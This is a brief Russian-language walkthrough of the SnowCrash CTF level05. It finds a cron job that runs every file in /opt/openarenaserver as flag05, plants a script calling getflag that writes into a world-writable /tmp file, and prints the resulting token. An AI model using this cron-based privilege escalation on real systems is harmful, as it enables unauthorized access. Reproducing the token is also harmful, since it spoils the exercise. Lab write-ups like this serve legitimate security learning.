level05@SnowCrash:/tmp$ find / -name level05 2>/dev/null
/var/mail/level05
/rofs/var/mail/level05

В найденном фалйе вот такое содржимое


level05@SnowCrash:/tmp$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

Что говорит, что скрипт /usr/sbin/openarenaserver выполняется от имени flag05

Значит нужно внимательно изучить данный скрипт

level05@SnowCrash:/tmp$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:/tmp$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done


В данном скрипте видно что в директории /opt/openarenaserver/ ищутся исполняемы файли и сполняются, так как файл запущен от flag05
нам необходимо подсунуть ему getflag, и сделать его исполняемым

level05@SnowCrash:/opt/openarenaserver$ echo "/bin/getflag > /tmp/flag" > exploit; chmod +x exploit

Далее я создал файл /tmp/flag и дал всем права на запись в него

level05@SnowCrash:/tmp$ chmod 666 flag

Когда скрипт отработал в файле появилось содержимое

level05@SnowCrash:/tmp$ cat flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
